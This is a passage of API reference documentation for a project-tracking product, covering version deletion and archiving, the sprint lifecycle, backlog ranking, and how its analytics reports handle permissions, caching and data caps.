**Un-release** — `POST …/versions/{versionId}/unrelease` clears `released` and `releasedAt` but **preserves `releaseDate`** (it goes back to being the plan), so the round-trip loses no data. Un-releasing something that is not released is a `409`. Note that issues moved away by a `moveUnresolvedToVersionId` are *not* moved back — that was a separate, explicit action.

**Archive vs delete** — archiving is the recommended, non-destructive option, is always allowed even while the version is in use, and is orthogonal to `released` (archiving old shipped releases is how the list stays short): the version leaves every picker and the default listing, existing links survive (and come back on the issue with `"archived": true` so a client can dim them), it can no longer be linked to an issue (`422`), and it is reversible.

`DELETE` returns `409` while the version is linked to any issue in **either** role (the message states the count), unless you pass one of two escape hatches:

- `force=true` — delete every fix and affects link to it, then delete the version;
- `remapToId=<versionId>` — re-point every link of **both** roles to another version of the same project, then delete. The target must not be the version being deleted and must not be archived (`422` otherwise); a **released** target *is* allowed here — back-porting a deleted version's links onto a shipped release is legitimate bookkeeping, which is why this differs from `moveUnresolvedToVersionId`.

**When both are supplied, `remapToId` wins** — it is the strictly more specific, non-destructive intent. A released version may be deleted like any other. Neither path writes per-issue history (a delete can touch thousands of issues). A `remapToId` delete can lose the same race as a release-time move: a concurrent issue edit that re-creates a link collision mid-remap makes the call fail with a **retryable `409`**, and the delete is rolled back with it — the version is still there and its links are untouched.

**Archived projects.** Every management call (create, update, release, un-release, archive, unarchive, delete) on a version of an **archived project** returns `409 "Project is archived"` — the release plan is frozen exactly as issue edits are. Reads keep working.

**Usage** — `GET …/versions/{versionId}/usage` backs the delete-confirmation dialog and the release dialog's "move N unresolved issues to →" prompt. `unresolvedFixIssueCount` is exactly what `moveUnresolvedToVersionId` would move:

```json
{ "fixIssueCount": 24, "affectsIssueCount": 3, "unresolvedFixIssueCount": 6 }
```

**Using versions** — set `fixVersionIds` / `affectsVersionIds` when creating or updating an [issue](#issues) (full-replacement sets, one per role), filter the board/backlog with `?fixVersionId=`, and query them in [HQL](#search-hql) as `fixVersion` and `affectsVersion`. An issue's own versions come back in `IssueResponse.fixVersions` and `IssueResponse.affectsVersions` as `{id, name, released, archived}`, ordered by name, `[]` when there are none. An issue may carry at most 20 versions **per role**.

## Sprints & backlog

A **sprint** is one project's iteration — a time-box with a goal, a start and an end, holding the issues the team committed to. Like [labels](#labels), [components](#components) and [versions](#versions) it is *content*, not configuration: sprints never appear in a project's [config](#project-configuration), and two projects may each run a "Sprint 7".

**Lifecycle — one way only.** A sprint is created `FUTURE` (a planning bucket), moves to `ACTIVE` when it is started, and ends `COMPLETED` when it is completed. **At most one sprint per project may be active**, and that is enforced by the database rather than only in code. **There is no re-open**: a completion is a reported event (the done-vs-carried-over numbers were handed to the user and the unfinished issues were already moved), so the recovery path is "create a new sprint and move the issues back" — two clicks, no ambiguity.

**Rank.** Every issue in a project carries a position in one project-wide order that the **board and the backlog share** — there is no second "backlog order" that could disagree with the board. The rank is **server-written only** and is deliberately not exposed in any response: to move an issue you name the neighbours you dropped it between (`POST …/issues/{number}/rank`), and the server computes the placement. A newly created issue lands at the **bottom** of the backlog (filing an issue is not a priority statement).

**Story points** are a native issue attribute (`storyPoints` on every issue), not a custom field: `0`–`999` with at most 2 decimals, where `null` means **unestimated** — deliberately not the same as `0`, which is why the section totals report `unestimatedCount` separately.

**Permissions.** Reads (sprint list/detail, completion preview, the backlog view) need project membership. The **lifecycle** — create, rename/re-plan, start, complete, delete — needs [`sprint.manage`](#permissions): a project `MANAGER`, **or** an `OWNER`/`ADMIN` of the enclosing workspace (who need not be a project member). Putting issues *into* a sprint and taking them out is a **separate** permission, `sprint.assign`, held by every ordinary contributor — planning is teamwork, and requiring the lifecycle permission to drag would make the backlog read-only for most of the team. Dragging within a section is `issue.rank`. A missing workspace, a missing project or a non-member all give `404`, never `403`; `403` is reserved for a member without the permission, and [names it](#what-a-403-says).

**`sprint.assign` guards every door.** The sprint endpoints are not the only way to move an issue between sections: `PATCH …/issues/{number}` with `sprintId`/`clearSprint` and `POST …/issues/{number}/rank` with a sprint change are checked against the same permission, so it cannot be bypassed with a different request shape.

**The project's [delivery capabilities](#delivery-capabilities) change nothing here.** `board: KANBAN` does not close the sprint API and `estimation: false` does not reject `storyPoints` — every endpoint below behaves identically whatever a project has declared. A capability hides vocabulary in the UI; it is never a permission.

| Method | Path | Auth | Description |
|---|---|---|---|
| `GET` | `/workspaces/{wsId}/projects/{pId}/sprints?state=&page=&size=` | member | The project's sprints — **always paginated** |
| `POST` | `/workspaces/{wsId}/projects/{pId}/sprints` | `sprint.manage` | Create a `FUTURE` sprint. `201` |
| `GET` | `/workspaces/{wsId}/projects/{pId}/sprints/{sprintId}` | member | Get one |
| `PATCH` | `/workspaces/{wsId}/projects/{pId}/sprints/{sprintId}` | `sprint.manage` | Rename / re-goal / re-plan the dates |
| `POST` | `/workspaces/{wsId}/projects/{pId}/sprints/{sprintId}/start` | `sprint.manage` | `FUTURE` → `ACTIVE` (body optional) |
| `GET` | `/workspaces/{wsId}/projects/{pId}/sprints/{sprintId}/completion-preview` | member | What completing it would report |
| `POST` | `/workspaces/{wsId}/projects/{pId}/sprints/{sprintId}/complete` | `sprint.manage` | `ACTIVE` → `COMPLETED` (body required) |
| `POST` | `/workspaces/{wsId}/projects/{pId}/sprints/{sprintId}/issues` | `sprint.assign` | Put a batch of issues into the sprint |
| `DELETE` | `/workspaces/{wsId}/projects/{pId}/sprints/{sprintId}/issues/{issueId}` | `sprint.assign` | Take one issue out. `204` (idempotent); `422` for a completed sprint |
| `DELETE` | `/workspaces/{wsId}/projects/{pId}/sprints/{sprintId}?force=false` | `sprint.manage` | Delete. `204` |
| `GET` | `/workspaces/{wsId}/projects/{pId}/backlog?…&includeDone=false` | member | The whole planning view in one request |
| `POST` | `/workspaces/{wsId}/projects/{pId}/issues/{number}/rank` | `issue.rank` | Move an issue in the shared rank (`sprint.assign` too when it changes sprint) |

**List** — always paginated (the [envelope](#conventions), default size 50): open sprints are capped, but completed ones accumulate for years. The order is `ACTIVE` first, then `FUTURE` by `sequence` ascending, then `COMPLETED` newest-first. `state` is a **repeatable** filter (`?state=ACTIVE&state=FUTURE`); omitting it returns every state. The counters are always filled — they cost one grouped query for the whole page, so there is nothing to opt out of:

```json
{ "id": "0198f7d4-…", "name": "Sprint 7", "goal": "Ship billing v2",
  "state": "ACTIVE", "sequence": 7,
  "startAt": "2026-08-10T09:00:00Z", "endAt": "2026-08-24T17:00:00Z",
  "completedAt": null, "daysRemaining": 6,
  "issueCount": 12, "doneIssueCount": 7,
  "points": 34.5, "donePoints": 21, "unestimatedCount": 2,
  "createdAt": "…", "updatedAt": "…" }
```

`daysRemaining` counts whole days from today (UTC) to `endAt` for an **active** sprint only — `0` means it ends today and a **negative** value means it is overdue; it is `null` for a future or completed sprint, which has nothing to count down. `points` sums the story points of the sprint's issues (unestimated ones contribute nothing rather than zero), and `donePoints` sums them over the DONE-category issues.

**Create** — the body is `{"name?", "goal?", "startAt?", "endAt?"}` and everything in it is optional, so `{}` creates the next sprint:

- a blank or absent `name` becomes `"Sprint {sequence}"` — which is why default names can never collide. A supplied name is normalized server-side (Unicode NFC, invisible control/format characters stripped, whitespace trimmed and collapsed) and must be 1–60 characters afterwards, else `400`;
- names are **unique per project, case-insensitively, completed sprints included** — a collision is a `409`. The same name in a different project is fine;
- `goal` is optional, max 500 characters;
- `startAt`/`endAt` are only **the plan** — filling them in does not start anything. `endAt <= startAt` is a `422`;
- a project that already holds the maximum number of **open** sprints (20 — `FUTURE` + `ACTIVE`; completed ones are history and don't count) returns `422`.

```bash
curl -X POST $BASE/workspaces/$WS/projects/$PROJ/sprints \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"name": "Sprint 7", "goal": "Ship billing v2"}'
```

**Update** — `PATCH` takes `{"name?", "goal?", "startAt?", "endAt?", "clearStartAt?", "clearEndAt?"}`; omitted fields are left unchanged, and `clearStartAt`/`clearEndAt` unset the dates (the `assigneeId`/`clearAssignee` convention — a plain `null` can't be told apart from an omitted field). There is deliberately **no** `state` field: the lifecycle moves only through the two calls below, and it never moves backwards.

The **resulting** dates are validated, not the ones in the payload: `endAt <= startAt` after the patch is applied is a `422`. Two further refusals guard `startAt`, both `422`:

- `"An active sprint must keep a start date"` — an `ACTIVE` sprint cannot be left without one, so `clearStartAt` on a running sprint is rejected. A sprint that is running has, by definition, started.
- `"A sprint's start date can only be changed while it is still in the future"` — once a sprint has left `FUTURE`, its `startAt` is frozen, for `ACTIVE` and `COMPLETED` alike. **A started sprint's start date is the origin its reports are measured from**: the scope it committed to is recorded against the original start, so moving the start afterwards would leave the recorded commitment dated to the old start while the sprint claims a new one — pull the start earlier and every recorded commitment sits *after* it, so "committed scope at start" reads `0`. The field is not frozen out of caution; it is frozen because two records would otherwise disagree. The recovery path for a wrong start is a new sprint, not an edit to a running one.

**Equality here is by instant, not by representation.** The comparison is on the moment itself, so re-sending the same instant written in a different UTC offset (`2026-08-10T09:00:00+02:00` vs `2026-08-10T07:00:00Z`) is not an edit and is accepted. A client that reads a sprint and `PATCH`es the whole object back unchanged will not trip this rule.

**Start** — `POST …/sprints/{sprintId}/start`, body **optional**: a bare `POST` means "start it now and run it for 14 days". `{"startAt?", "endAt?", "goal?"}` overrides any of that; `endAt` defaults to `startAt` + the instance's default sprint length, and a `startAt` in the past is allowed on purpose (backfilling a sprint that actually began on Monday is normal) — but a `startAt` in the **future** is not.

- Starting a sprint that is not `FUTURE` — already active, or completed — is a `409`, so a double-click can never re-start anything.
- Starting one while **another sprint of the project is already active** is a `409` too, and that verdict comes from a database-level uniqueness rule, so two simultaneous starts always resolve to exactly one winner.
- Starting an **empty** sprint is allowed: blocking it would only push teams to file a placeholder issue. The UI warns; the API does not.
- A `startAt` in the **future** is a `422`: *"A sprint can't be started with a start date in the future — start it when it actually begins. Until then leave it planned: a future sprint's dates stay editable, and starting it stamps the start for you."* (`endAt <= startAt` is a `422` here too.)

**Do what the refusal says.** Planning a future start is entirely legal — `POST …/sprints` and the `PATCH` above accept any date, and a `FUTURE` sprint's dates stay editable right up to the moment it starts. Leave the sprint planned until it actually begins, then start it: a bare `POST` stamps the start for you, so the date never has to be typed at all. Only this one door is guarded, because it is the one that turns a plan into history.

**Why it is refused rather than accepted and quietly clamped** — and why this rule and the `startAt` freeze above must be read as a pair, since either one alone gives a wrong model of the endpoint. A forward-dated start writes a `startAt` that the sprint's own commitment record legitimately disagrees with: the commitment is stamped when the start actually happens, so a burn-up measured over the sprint's window would report a committed scope of `0`. The freeze then makes that wrong date **permanent** — once the sprint has left `FUTURE` its `startAt` can no longer be patched, so the only way out of a mistyped year is to complete the sprint and recreate it. Freezing a value is only defensible if a wrong one cannot get behind the freeze in the first place. A forward-dated start also allowed a sprint to be *completed before it started*, which the velocity report reads as a negative-length iteration.

**Five minutes of clock skew are tolerated, and treated as `now`**: a `startAt` up to five minutes ahead of the server's clock is not refused — it is **recorded as `now`**, so the sprint's stored `startAt`, the one echoed back in the response, and the sprint's own commitment records all carry the same instant. The tolerance means "a slightly fast clock is now", not "a slightly future start is accepted and stored as sent". It exists for **unsynchronised client clocks, not as policy** — it is not configurable, and it is far too small to express an intention. Nobody plans a sprint to begin in four minutes.

**Completion preview** — `GET …/sprints/{sprintId}/completion-preview` is the completion dialog's data source and is readable by any project member (looking at the numbers is not a commitment). It returns the same counters the completion itself reports, off the same query, so the two cannot drift:

```json
{ "totalIssueCount": 12, "doneIssueCount": 7, "unfinishedIssueCount": 5,
  "totalPoints": 34.5, "donePoints": 21, "unfinishedPoints": 13.5,
  "targetCandidates": [ { "id": "0198f7d5-…", "name": "Sprint 8", "state": "FUTURE" } ] }
```

An empty `targetCandidates` means the project has no future sprint to carry work over to — offer "create a sprint" instead.

**Complete** — `POST …/sprints/{sprintId}/complete`. Unlike `start` the body is **required**, because the disposition of the unfinished work is a real decision and defaulting it silently would move issues nobody asked to move:

```bash
curl -X POST $BASE/workspaces/$WS/projects/$PROJ/sprints/$SPRINT/complete \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"moveUnfinishedTo": "SPRINT", "targetSprintId": "0198f7d5-…"}'
```

- `moveUnfinishedTo` is `BACKLOG` or `SPRINT`; with `SPRINT` a `targetSprintId` is required and must be a **`FUTURE` sprint of the same project** and not the sprint being completed — anything else is a `422`.
- Every issue whose status category is **not DONE** moves to the chosen destination. **DONE issues keep their sprint** — that is the sprint's record of what it delivered.
- The **rank is never rewritten**, so carried-over items keep their relative order wherever they land.
- Completing something that is not `ACTIVE` is a `409` — a double-click gets one `200` and one `409`, never a second destructive move.

The response is the honest done-vs-carried-over report (nothing is persisted as a report artifact — burndown and velocity are not part of this release):

```json
{ "sprint": { "id": "0198f7d4-…", "state": "COMPLETED", … },
  "completedIssueCount": 7, "carriedOverIssueCount": 5,
  "carriedOverToSprintId": "0198f7d5-…",
  "donePoints": 21, "carriedOverPoints": 13.5 }
```

**Putting issues in and taking them out** — `POST …/sprints/{sprintId}/issues` takes `{"issueIds": [...], "position": "TOP"|"BOTTOM"}` (default `BOTTOM`) and returns the sprint with refreshed counters. Issues are addressed by **id** here. An issue already in the sprint is a silent no-op (no history entry, no `version` bump); the rest are placed at the top or bottom of the sprint's slice of the shared rank, keeping their relative order among themselves. An unknown or foreign-project issue id is a `422` ("Unknown issue" — never a `404`, which would confirm existence), an empty list or more than 100 distinct ids is a `400`, and a `COMPLETED` target sprint is a `422` (assigning to the *active* one mid-sprint is fine — a scope change is a real event).

This call is a **removal** path too: an issue joining the sprint leaves whichever sprint it is in today, so a completed sprint's frozen membership applies in both directions here. You get `422 "Sprint 'X' is completed"` when the **target** sprint is completed, **and** when any issue in `issueIds` is currently in a completed sprint (`X` is then that source sprint) — the same message and `ProblemDetail` shape as `DELETE …/sprints/{sprintId}/issues/{issueId}`. The batch is validated as a whole before anything moves, so the rejection is **atomic**: one frozen member fails the request and *no* issue changes sprint or rank, rather than leaving the move half-applied. Issues already in the target sprint are no-ops and are not part of that check.

`DELETE …/sprints/{sprintId}/issues/{issueId}` takes one issue back out, preserving its rank. It is **idempotent**: removing an issue that is not in that sprint returns `204` as well, because the request expresses "this issue must not be in this sprint" and that is already true. An `issueId` that does not resolve **within the project** is still a `404`. A **`COMPLETED`** sprint is a `422` ("Sprint 'X' is completed"): its membership is the delivery record the completion already reported, so it is frozen on the removal side exactly as it is on the assignment side. The two rules coexist in that order — the idempotent check runs **first**, so an issue that is not in the sprint still gets `204`, completed or not.

**Delete** — `DELETE …/sprints/{sprintId}` needs `sprint.manage` and refuses an **ACTIVE** sprint with `409` ("complete it first"). A future or completed sprint that still holds issues is a `409` too unless you pass `force=true`, which detaches them first — their **rank is preserved**, so they keep their relative place in the backlog they return to. If another curator deleted the same sprint a moment earlier you get a `404` rather than a `500`: the row is removed by a conditional delete, so the loser of that race is told the sprint is gone — which it is, so treat it as success.

**Archived projects.** Every sprint mutation (create, update, start, complete, delete, add/remove issues), every rank move and the project's own `PATCH …/projects/{pId}` on an **archived project** return `409 "Project is archived"`. Reads keep working.

### The planning view

`GET …/projects/{pId}/backlog` returns everything the backlog screen renders in one round trip: the project's **open** sprint sections (`ACTIVE` first, then `FUTURE` by `sequence`) above the rank-ordered backlog. It takes exactly the same filters as the [issue list](#issues) (`statusId`, `assigneeId`, `priorityId`, `componentId`, `labelId` + `labelMatch`, `fixVersionId`), all applied server-side so filtering searches the whole project rather than the page already on screen, plus `includeDone`.

`includeDone` defaults to `false` — a done, unranked issue is planning noise. It affects the **backlog** section only: sprint sections always include their DONE issues, because that is the sprint's record of what it delivered.

```json
{
  "sprints": [
    { "sprint": { "id": "0198f7d4-…", "name": "Sprint 7", "state": "ACTIVE", … },
      "issues": [ { "id": "…", "key": "DEMO-18", … } ],
      "truncated": false, "totalAvailable": 12,
      "stats": { "issueCount": 12, "doneIssueCount": 7,
                 "points": 34.5, "donePoints": 21, "unestimatedCount": 2 } }
  ],
  "backlog": {
    "issues": [ … ], "truncated": true, "totalAvailable": 812,
    "stats": { "issueCount": 812, "doneIssueCount": 0,
               "points": 1204, "donePoints": 0, "unestimatedCount": 310 }
  },
  "sectionCap": 300,
  "bulkMoveCap": 100
}
```

Each section is capped independently at `sectionCap` (300) and reports `truncated` / `totalAvailable` — but its `stats` are computed over the **whole** section, so a truncated section still shows honest totals. Treat sections as independently refreshable.

`bulkMoveCap` (100) is the limit on **one** `POST …/sprints/{sprintId}/issues` call, and it is a *different* number from `sectionCap` on purpose. A "move everything to sprint X" action is driven by the section you rendered, so a client that assumes one cap from the other would `400` on every section larger than the bulk limit. Chunk bulk moves at `bulkMoveCap` instead of hardcoding a value.

### Ranking an issue

`POST …/issues/{number}/rank` moves one issue in the order the board and the backlog share, optionally into or out of a sprint in the same request. The moved issue is addressed by **number** (the usual issue addressing) while the anchors and the sprint travel as **ids**:

```bash
curl -X POST $BASE/workspaces/$WS/projects/$PROJ/issues/18/rank \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"afterIssueId": "0198a…", "beforeIssueId": "0198b…", "sprintId": "0198f7d4-…"}'
```

- You send **anchors, never a rank value**. Supply `afterIssueId`, `beforeIssueId`, or both — the server fills in whichever neighbour is missing by looking at the target section. Sending **neither** is only valid together with a sprint change, and means "append to the end of that section"; a request with no anchor and no sprint change asks for nothing and is a `400`.
- `sprintId` moves the issue into a sprint at the same time and `clearSprint: true` returns it to the backlog; sending both is a `400`. An unknown, foreign-project or **completed** target sprint is a `422` — and so is moving an issue whose **current** sprint is `COMPLETED`, in or out: that membership is a delivered fact and is frozen both ways. A pure rank move *within* a completed sprint is still fine.
- Both anchors must already be **in the target section** — dropping next to a row that lives in a different sprint is an ordering paradox, not a placement, so it is a `422`; so is naming the moved issue itself as its own anchor, or an anchor that does not resolve in the project.
- If the anchors are no longer consistent with each other (someone else re-ordered the list under you), the answer is `409` "the list changed — refresh", never a silent arbitrary placement.
- `version` is **optional**: send it and you get the usual `409` on a stale read; omit it and the move simply applies. Ranking is a positional, last-drag-wins operation, so a mandatory optimistic check would produce a storm of conflicts during a planning meeting.
- Dropping an issue into the same gap over and over eventually exhausts it, and the server re-spaces the whole project's ranks. That rebalance is **throttled to once per project per 60 s** — a second one inside the window answers `429` with a `Retry-After` header (seconds). This is a **retryable throttle, not a fault**: nothing was moved, and the identical request succeeds after the wait. Back off for `Retry-After` rather than retrying immediately. Hitting it in normal use is essentially impossible — right after a rebalance every gap is wide again, so exhausting one takes ~26 successive drops into that same spot.
- The response is the full updated [`IssueResponse`](#issues). A rank change writes **no** history entry (positional churn would drown the log); a sprint change in the same request does.
- **Both permissions are checked before the project's state.** `issue.rank` is checked first, and `sprint.assign` as soon as the request is known to move the issue between sections — and only then does the endpoint refuse an **archived** project with `409`. So a caller who lacks either permission gets the `403`, never the archive conflict, which is the same ordering [deleting an issue](#issues) and [deleting an attachment](#attachments) already follow.

**Using sprints elsewhere** — set `sprintId` / `storyPoints` when creating or updating an [issue](#issues) (`clearSprint` / `clearStoryPoints` unset them), filter the board and backlog with `?sprintId=` or `?noSprint=true`, and query them in [HQL](#search-hql) as `sprint` (alias `sprints`) and `storyPoints` (alias `points`). An issue's own sprint comes back in `IssueResponse.sprint` as `{id, name, state}`, or `null`.

## Reports

Read-only analytics, six of them over one project under `/workspaces/{wsId}/projects/{pId}/reports` and a seventh — [Insights](#insights--break-down-the-query-in-the-search-box) — over a workspace-wide HQL query, on the search base path. Each of the six project reports also has a **[`.csv` sibling](#csv-exports--the-chart-as-a-file)** that exports the plotted series as a file. Flow is the **first** of these endpoints and the one that fixes the conventions the rest of them inherit — everything under "How every report behaves" below is a property of the family, not a quirk of `/flow`. Cycle time and aging WIP are the two halves of one page and read best together. The two **sprint** reports are the other pair: the burn-up asks *will this sprint land, and what happened to the plan*, the review is the record a retro reads out, and they are computed from one shared ledger so they can never disagree about what was in the sprint — though they disagree, deliberately, about which story points to use. **Velocity** reads the same ledger across several completed sprints: what recent sprints delivered, and the band to plan the next one with. **Insights** is the odd one out — a `POST`, workspace-scoped, and refusing with `422` rather than `400` — because its dataset is not a project but whatever query is in the search box.

| Method | Path | Auth | Description |
|---|---|---|---|
| `GET` | `/workspaces/{wsId}/projects/{pId}/reports/flow?from=&to=&interval=&typeId=&componentId=&labelId=` | member | Created vs resolved over a window, plus the open-count line and the window totals |
| `GET` | `/workspaces/{wsId}/projects/{pId}/reports/cycle-time?from=&to=&typeId=&componentId=&labelId=` | member | One dot per issue completed in the window, plus the p50/p85 of cycle time and lead time |
| `GET` | `/workspaces/{wsId}/projects/{pId}/reports/aging` | member | The open issues, oldest first, in the columns of the project's workflow, under the project's lifetime cycle-time percentiles |
| `GET` | `/workspaces/{wsId}/projects/{pId}/reports/sprint-burnup?sprintId=&measure=` | member | One sprint's scope and completed lines, day by day, plus the log of every change to its scope |
| `GET` | `/workspaces/{wsId}/projects/{pId}/reports/sprint-review?sprintId=` | member | Committed, added after start, removed before end, completed and carried over — five lists and a header line |
| `GET` | `/workspaces/{wsId}/projects/{pId}/reports/velocity?sprints=&measure=` | member | The last N completed sprints as bars, plus a p50/p85 band with its sample size |
| `POST` | `/workspaces/{wsId}/search/insights` | member | Break down the HQL query in the search box — bars, optional stacking, click-through fragments |

### How every report behaves

**Project membership, and nothing else.** There is no `report.view` [permission](#permissions) and there is not meant to be one: this product has no read permissions, and every number a report prints is derivable by the same member from the [search API](#search-hql) they already hold, so a gate here would protect nothing. Any workspace member who can reach the project may open its reports, including one with no explicit project membership. Anonymous is `401`; an unknown workspace, an unknown project, a project that belongs to a **different** workspace and a non-member are all `404`, indistinguishably — `403` is never returned by a report.

**Three things this family will not do, and they are policy rather than backlog.** They are stated here because they are properties of the whole surface, not of the one report where they bite hardest:

- **No per-person breakdown of a published metric.** Not a filter, not a field, not a tooltip extra, not a CSV column. The evidence is specific: velocity compared between people or teams is read as a productivity score, and teams respond by inflating estimates — the number goes up and the delivery does not.
- **No aggregate above the project.** Every one of these reports is served from below `/projects/{pId}/`, and there is deliberately no workspace-level rollup. Comparing two teams means opening two pages and doing the arithmetic yourself, and **that friction is the design** — the harm comes from comparisons cheap enough to make without thinking about them.
- **No single quotable number.** Where this family forecasts, it returns a range with its sample size attached, precisely so there is nothing to paste into a status report.

**The line is a published metric versus an ad-hoc query, and it is what makes [Insights](#insights--break-down-the-query-in-the-search-box) consistent with [velocity](#velocity--how-much-should-we-plan-for-next-sprint) rather than an exception to it.** Velocity has a stable URL and gets read out in a ceremony, so a per-person column in it becomes a comparison whether anyone meant it or not — and it refuses `ASSIGNEE` outright. Insights is whatever HQL somebody just typed: it is not addressable as "the team’s number", and the same person could get the same breakdown by running eight searches by hand — so it offers `ASSIGNEE` as a grouping dimension. Same policy, opposite answers, because they are different objects.

**A project's [delivery capabilities](#delivery-capabilities) change nothing.** No status code on any report depends on a capability: `board: KANBAN` does not close a report and `estimation: false` does not change one's shape. A capability hides vocabulary in the UI; it is never a permission and never a `404`.

**Caching** — every report answers `Cache-Control: private, max-age=60` **and `Vary: Authorization`**. (With one caveat that matters: `/search/insights` is a `POST`, and **no browser serves a `POST` response from its HTTP cache**, so there those headers are consistency and defence rather than effect, and the 60-second de-duplication has to be yours. See its own section.) `private` is the load-bearing half: a report is one tenant's data and must never be held by a shared cache. The `Vary` is not decoration — a browser's HTTP cache keys on (method, URL) and **ignores request headers unless `Vary` names them**, so without it a shared-profile browser could replay a cached `200` to a different bearer token inside the 60 s, one the server would have answered `404`.

**The shared `meta` block.** Every report response carries the same provenance object:

```json
"meta": {
  "computedAt": "2026-08-19T09:14:22Z",
  "basedOnIssues": 1842,
  "truncated": false,
  "cap": 20000,
  "firstIssueAt": "2024-11-04T08:31:00Z",
  "unmatchedFilters": []
}
```

It exists because the classic complaint about a reporting feature is *"these numbers don't match what I expected"*, and what produces it is a report that quietly left data out. A response that states **when** it was computed, **how many issues** it was computed from, **whether a cap bit**, **how far back its data goes** and **whether a filter it was given matched nothing** cannot fail that way silently.

- `computedAt` — reports are live reads, so two tabs opened minutes apart legitimately disagree. This is how a reader tells which is which.
- `basedOnIssues` — how many **distinct issues** the numbers came from. Which population that is follows from the report's own question, so each report says: on `/flow` the issues *touching* the window, i.e. created in it **or** closed in it; on `/cycle-time` the completed issues in the window after filters (the same number as `sampleSize`); on `/aging` the project's open issues; on `/sprint-burnup` and `/sprint-review` the distinct issues that have ever been in that sprint; on `/velocity` the distinct issues the sampled sprints' ledgers hold, with an issue that appeared in two of them counted once; on `/search/insights` the distinct issues matching your query — the same number the search result list shows, and **deliberately not the sum of the series**, because a many-valued dimension puts one issue in several buckets. On `/flow` it is deliberately **not** `created + resolved` — an issue created and closed inside the same window appears on both lines but is one issue of evidence, not two, and adding the lines together would overstate the report's own evidence, the exact species of quiet wrongness `meta` exists to prevent. It is never `items.length`: when a cap bites this is deliberately the larger number, because it must state how many issues the report was *about*, which is precisely what the reader can no longer see.
- `truncated` — whether `cap` actually bit. When `true` the report is a partial view and a client must say so above the chart. **On `/flow` it is always `false`, and that is a fact rather than a stub:** the flow report aggregates inside PostgreSQL and returns at most one row per bucket, so the row cap physically cannot bite there. **Always `false` on `/search/insights` too, for the same reason** — it aggregates in SQL and materialises no issue row at all; what truncates there is *buckets*, disclosed by its own `slicesTruncated` / `cellsTruncated` flags rather than by this one. It does bite on the row-level reports, and **which end survives differs by report, on purpose**: `/cycle-time` keeps the **most recent** rows, because its reader wants the latest work, and `/aging` keeps the **oldest**, because its reader wants the most rotten item. A client that assumes the wrong end draws a wrong chart from a correct response. On both, the aggregates — percentiles, counts — are computed over the *whole* matching set, so truncation shortens the list and never moves a line.

  **On the two sprint reports the cap counts ledger *event* rows rather than issues**, and the end that survives is the **oldest**: the ledger is read oldest-first, so a truncated sprint keeps its commitment and its earliest changes — the head of the chart stays exact and its tail goes missing, which is the recoverable failure. The opposite ordering would drop the commitment batch and make every number wrong. In practice it cannot bite (one sprint's ledger is hundreds of rows against a cap of 20 000), but "in practice" is not an ordering guarantee, so the ordering is. **`seriesTruncatedAt` on `/sprint-burnup` is a different limit and does not set this flag** — that one clips the *day series* against `app.reports.max-window-days` and names the day the chart stops at; `truncated` means only that the row cap printed beside it in `cap` actually bit. Two limits, two signals, on purpose: folding them together once made a twelve-issue sprint answer `truncated: true` beside `cap: 20000` and put "20 000" in a banner about a report that had dropped no rows at all.

  **On `/velocity` this flag also changes what the response is willing to say.** Its sweep reads up to twelve sprints' ledgers at once, so a cap that bites removes whole sprints rather than shaving one; those sprints are dropped from `sprints[]` instead of being drawn as all-zero bars, **and `forecast` is suppressed** — a band over whichever bars happened to fit is not the band anybody asked for. So there, `truncated: true` means "this chart is shorter than you asked for and its forecast is withheld", not merely "a list was cut".
- `cap` — the row budget that *would* bite. Reported by every report **including the ones that cannot hit it**, so a client never has to guess which budget a number was measured against.
- `firstIssueAt` — when the **earliest issue the project holds that this report's filters admit** was created, or `null` when there is none. This is what "we only have N days of history" has to be measured from: the project's own `createdAt` is a different date, often years off, and getting it used to cost a second request for a number that was never the right one.

  **Filters yes, window never — on every report, without exception.** It is a property of the **project**, not of the sample a given report happens to be describing, so it is **not bounded by `from`/`to` and routinely predates `from`**. That is the entire use of it: it is what tells a reader whether the window they chose is wider than the data behind it. Reading it over the window would not merely make one report disagree with another — it would be **circular**. The earliest issue inside a 14-day window is at most 14 days old, so a five-year-old project asking for a fortnight would report a fortnight of history, and a client's thin-data warning would fire on every project. A number read over the window can only ever return the window.

  **Filters do still apply**, so on a filtered chart it reads "the first issue this chart could ever have shown" — with `typeId` set it is the first issue *of that type*, and with a `componentId` or `labelId` the first issue carrying that component or label. A filter that matches **nothing** therefore makes this `null`, beside that filter's name in `unmatchedFilters`. And it is the first **issue**: not the project's own creation date, and reading it as the project's age is the mistake this bullet exists to prevent. It is **`null` on any report that spans a workspace rather than a project** — today that is `/search/insights`. This is a per-project property, and giving one field name a second, workspace-wide definition was refused.
- `unmatchedFilters` — which of the filter parameters you sent match **no issue in this project at all**; never `null`, and empty when every filter matched something or none was sent. Entries are the query-parameter names themselves (`typeId`, `componentId`, `labelId`), so you can map one straight back to the control the user touched. Always empty on `/aging`, `/sprint-burnup`, `/sprint-review` and `/velocity`, which take no filters to leave unmatched — `sprintId` is a **subject**, so an id that names nothing is a `404` there rather than an entry here. Always empty on `/search/insights` too: an HQL name that matches nothing is a `422` from the resolver, long before it could be reported as unmatched. It exists because a typo'd or stale filter id otherwise renders a complete, plausible, **all-zero** chart: *"no bugs were created in Q1"* and *"your filter matched nothing"* are the same picture without it. Note the deliberately weak and exact claim — **"no issue in this project carries this id"**, *not* "this id does not exist". A perfectly valid issue type nobody here has ever used is reported too, and saying nothing about whether the id exists elsewhere in the taxonomy is what keeps the disclosure limited to data you can already see.

**A window over the cap is a `400` that names the cap. Nothing is ever silently clamped.** Windows are bounded (`app.reports.max-window-days`, 365 days by default, counting both endpoints), and a request wider than that is refused with a problem document whose `detail` names three things — the cap, the property key, and the length it actually measured:

```json
{ "status": 400,
  "detail": "Window is 400 days (2025-08-01 to 2026-09-03); the maximum is 365 days (app.reports.max-window-days). Narrow the range — it is not clamped for you, because a report of a different window than the one you asked for is worse than no report." }
```

The cap is a **maximum, not a strict inequality** — a window exactly that long is served. `from` after `to` is a second `400`, and it echoes both dates back, because the caller of a report API is usually a chart that did the date arithmetic itself and needs to know which end it got wrong. Since nothing is clamped, the `from`/`to` in a `200` are always exactly the ones you sent.

